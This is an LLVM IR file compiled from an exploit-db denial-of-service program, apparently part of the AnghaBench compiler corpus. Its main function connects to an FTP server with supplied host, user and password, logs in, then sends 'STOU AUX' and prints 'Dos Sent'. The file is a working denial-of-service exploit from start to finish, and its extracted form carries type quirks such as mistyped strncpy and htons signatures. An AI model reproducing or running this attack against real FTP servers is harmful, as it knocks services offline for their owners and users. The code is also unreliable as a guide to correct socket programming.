; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_463.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_463.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8*, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i32*, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [7 x i8] c"h:u:p:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"unknown host '%s'\0A\00", align 1
@SERVER_PORT = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [20 x i8] c"cannot open socket \00", align 1
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [29 x i8] c"%d: cannot bind port TCP %u\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"error \00", align 1
@.str.5 = private unnamed_addr constant [27 x i8] c"Trying To Connect To [%s]\0A\00", align 1
@.str.6 = private unnamed_addr constant [16 x i8] c"cannot connect \00", align 1
@.str.7 = private unnamed_addr constant [24 x i8] c"Trying Login With [%s]\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"331\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"421\00", align 1
@.str.11 = private unnamed_addr constant [30 x i8] c"Access Denied on your arse..\0A\00", align 1
@.str.12 = private unnamed_addr constant [21 x i8] c"Sending Pass - [%s]\0A\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@.str.14 = private unnamed_addr constant [4 x i8] c"230\00", align 1
@.str.15 = private unnamed_addr constant [4 x i8] c"530\00", align 1
@.str.16 = private unnamed_addr constant [33 x i8] c"Access Denied: Login Incorrect!\0A\00", align 1
@.str.17 = private unnamed_addr constant [11 x i8] c"STOU AUX\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"Dos Sent\0A\00", align 1
@.str.19 = private unnamed_addr constant [18 x i8] c"cannot send data \00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1000 x i8], align 16
  %7 = alloca [255 x i8], align 16
  %8 = alloca [255 x i8], align 16
  %9 = alloca [255 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 8
  %15 = alloca %struct.sockaddr_in, align 8
  %16 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %13, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 3
  br i1 %18, label %19, label %24

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @usage(i8* %22)
  br label %24

24:                                               ; preds = %19, %2
  br label %25

25:                                               ; preds = %48, %24
  %26 = load i32, i32* %4, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = call signext i8 @getopt(i32 %26, i8** %27, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store i8 %28, i8* %10, align 1
  %29 = sext i8 %28 to i32
  %30 = load i8, i8* @EOF, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp ne i32 %29, %31
  br i1 %32, label %33, label %49

33:                                               ; preds = %25
  %34 = load i8, i8* %10, align 1
  %35 = sext i8 %34 to i32
  switch i32 %35, label %48 [
    i32 104, label %36
    i32 117, label %40
    i32 112, label %44
  ]

36:                                               ; preds = %33
  %37 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 0
  %38 = load i32, i32* @optarg, align 4
  %39 = call i32 @strncpy(i8* %37, i32 %38, i32 255)
  br label %48

40:                                               ; preds = %33
  %41 = getelementptr inbounds [255 x i8], [255 x i8]* %8, i64 0, i64 0
  %42 = load i32, i32* @optarg, align 4
  %43 = call i32 @strncpy(i8* %41, i32 %42, i32 255)
  br label %48

44:                                               ; preds = %33
  %45 = getelementptr inbounds [255 x i8], [255 x i8]* %9, i64 0, i64 0
  %46 = load i32, i32* @optarg, align 4
  %47 = call i32 @strncpy(i8* %45, i32 %46, i32 255)
  br label %48

48:                                               ; preds = %33, %44, %40, %36
  br label %25

49:                                               ; preds = %25
  %50 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 0
  %51 = call %struct.hostent* @gethostbyname(i8* %50)
  store %struct.hostent* %51, %struct.hostent** %16, align 8
  %52 = load %struct.hostent*, %struct.hostent** %16, align 8
  %53 = icmp eq %struct.hostent* %52, null
  br i1 %53, label %54, label %58

54:                                               ; preds = %49
  %55 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 0
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i8* %55)
  %57 = call i32 @exit(i32 1) #3
  unreachable

58:                                               ; preds = %49
  %59 = load %struct.hostent*, %struct.hostent** %16, align 8
  %60 = getelementptr inbounds %struct.hostent, %struct.hostent* %59, i32 0, i32 2
  %61 = load i32, i32* %60, align 8
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  store i32 %61, i32* %62, align 4
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  %64 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %63, i32 0, i32 0
  %65 = bitcast i32* %64 to i8*
  %66 = load %struct.hostent*, %struct.hostent** %16, align 8
  %67 = getelementptr inbounds %struct.hostent, %struct.hostent* %66, i32 0, i32 1
  %68 = load i32*, i32** %67, align 8
  %69 = getelementptr inbounds i32, i32* %68, i64 0
  %70 = load i32, i32* %69, align 4
  %71 = load %struct.hostent*, %struct.hostent** %16, align 8
  %72 = getelementptr inbounds %struct.hostent, %struct.hostent* %71, i32 0, i32 0
  %73 = load i32, i32* %72, align 8
  %74 = call i32 @memcpy(i8* %65, i32 %70, i32 %73)
  %75 = load i32, i32* @SERVER_PORT, align 4
  %76 = call i8* @htons(i32 %75)
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  store i8* %76, i8** %77, align 8
  %78 = load i32, i32* @AF_INET, align 4
  %79 = load i32, i32* @SOCK_STREAM, align 4
  %80 = call i32 @socket(i32 %78, i32 %79, i32 0)
  store i32 %80, i32* %11, align 4
  %81 = load i32, i32* %11, align 4
  %82 = icmp slt i32 %81, 0
  br i1 %82, label %83, label %86

83:                                               ; preds = %58
  %84 = call i32 @perror(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0))
  %85 = call i32 @exit(i32 1) #3
  unreachable

86:                                               ; preds = %58
  %87 = load i32, i32* @AF_INET, align 4
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  store i32 %87, i32* %88, align 4
  %89 = load i32, i32* @INADDR_ANY, align 4
  %90 = call i32 @htonl(i32 %89)
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  %92 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %91, i32 0, i32 0
  store i32 %90, i32* %92, align 8
  %93 = call i8* @htons(i32 0)
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i8* %93, i8** %94, align 8
  %95 = load i32, i32* %11, align 4
  %96 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %97 = call i32 @bind(i32 %95, %struct.sockaddr* %96, i32 16)
  store i32 %97, i32* %12, align 4
  %98 = load i32, i32* %12, align 4
  %99 = icmp slt i32 %98, 0
  br i1 %99, label %100, label %106

100:                                              ; preds = %86
  %101 = load i32, i32* %11, align 4
  %102 = load i32, i32* @SERVER_PORT, align 4
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i32 %101, i32 %102)
  %104 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %105 = call i32 @exit(i32 1) #3
  unreachable

106:                                              ; preds = %86
  %107 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 0
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0), i8* %107)
  %109 = load i32, i32* %11, align 4
  %110 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %111 = call i32 @connect(i32 %109, %struct.sockaddr* %110, i32 16)
  store i32 %111, i32* %12, align 4
  %112 = load i32, i32* %12, align 4
  %113 = icmp slt i32 %112, 0
  br i1 %113, label %114, label %117

114:                                              ; preds = %106
  %115 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  %116 = call i32 @exit(i32 1) #3
  unreachable

117:                                              ; preds = %106
  %118 = getelementptr inbounds [255 x i8], [255 x i8]* %8, i64 0, i64 0
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0), i8* %118)
  %120 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %121 = getelementptr inbounds [255 x i8], [255 x i8]* %8, i64 0, i64 0
  %122 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %120, i32 1000, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0), i8* %121)
  %123 = load i32, i32* %11, align 4
  %124 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %125 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %126 = call i32 @strlen(i8* %125)
  %127 = call i32 @send(i32 %123, i8* %124, i32 %126, i32 0)
  store i32 %127, i32* %12, align 4
  %128 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %129 = call i32 @memset(i8* %128, i32 0, i32 1000)
  br label %130

130:                                              ; preds = %117, %145
  %131 = load i32, i32* %11, align 4
  %132 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %133 = call i32 @recv(i32 %131, i8* %132, i32 1000, i32 0)
  store i32 %133, i32* %12, align 4
  %134 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %135 = call i64 @strstr(i8* %134, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0))
  %136 = icmp ne i64 %135, 0
  br i1 %136, label %137, label %138

137:                                              ; preds = %130
  br label %146

138:                                              ; preds = %130
  %139 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %140 = call i64 @strstr(i8* %139, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0))
  %141 = icmp ne i64 %140, 0
  br i1 %141, label %142, label %145

142:                                              ; preds = %138
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.11, i64 0, i64 0))
  %144 = call i32 @exit(i32 0) #3
  unreachable

145:                                              ; preds = %138
  br label %130

146:                                              ; preds = %137
  %147 = getelementptr inbounds [255 x i8], [255 x i8]* %9, i64 0, i64 0
  %148 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.12, i64 0, i64 0), i8* %147)
  %149 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %150 = call i32 @memset(i8* %149, i32 0, i32 1000)
  %151 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %152 = getelementptr inbounds [255 x i8], [255 x i8]* %9, i64 0, i64 0
  %153 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %151, i32 1000, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0), i8* %152)
  %154 = load i32, i32* %11, align 4
  %155 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %156 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %157 = call i32 @strlen(i8* %156)
  %158 = call i32 @send(i32 %154, i8* %155, i32 %157, i32 0)
  store i32 %158, i32* %12, align 4
  br label %159

159:                                              ; preds = %146, %181
  %160 = load i32, i32* %11, align 4
  %161 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %162 = call i32 @recv(i32 %160, i8* %161, i32 1000, i32 0)
  store i32 %162, i32* %12, align 4
  %163 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %164 = call i64 @strstr(i8* %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0))
  %165 = icmp ne i64 %164, 0
  br i1 %165, label %166, label %167

166:                                              ; preds = %159
  br label %182

167:                                              ; preds = %159
  %168 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %169 = call i64 @strstr(i8* %168, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0))
  %170 = icmp ne i64 %169, 0
  br i1 %170, label %171, label %174

171:                                              ; preds = %167
  %172 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.11, i64 0, i64 0))
  %173 = call i32 @exit(i32 0) #3
  unreachable

174:                                              ; preds = %167
  %175 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %176 = call i64 @strstr(i8* %175, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.15, i64 0, i64 0))
  %177 = icmp ne i64 %176, 0
  br i1 %177, label %178, label %181

178:                                              ; preds = %174
  %179 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.16, i64 0, i64 0))
  %180 = call i32 @exit(i32 0) #3
  unreachable

181:                                              ; preds = %174
  br label %159

182:                                              ; preds = %166
  %183 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %184 = call i32 @memset(i8* %183, i32 0, i32 1000)
  %185 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %186 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %185, i32 1000, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.17, i64 0, i64 0))
  %187 = load i32, i32* %11, align 4
  %188 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %189 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %190 = call i32 @strlen(i8* %189)
  %191 = call i32 @send(i32 %187, i8* %188, i32 %190, i32 0)
  store i32 %191, i32* %12, align 4
  %192 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0))
  %193 = load i32, i32* %12, align 4
  %194 = icmp slt i32 %193, 0
  br i1 %194, label %195, label %200

195:                                              ; preds = %182
  %196 = call i32 @perror(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.19, i64 0, i64 0))
  %197 = load i32, i32* %11, align 4
  %198 = call i32 @close(i32 %197)
  %199 = call i32 @exit(i32 1) #3
  unreachable

200:                                              ; preds = %182
  ret i32 0
}

declare dso_local i32 @usage(i8*) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @strncpy(i8*, i32, i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
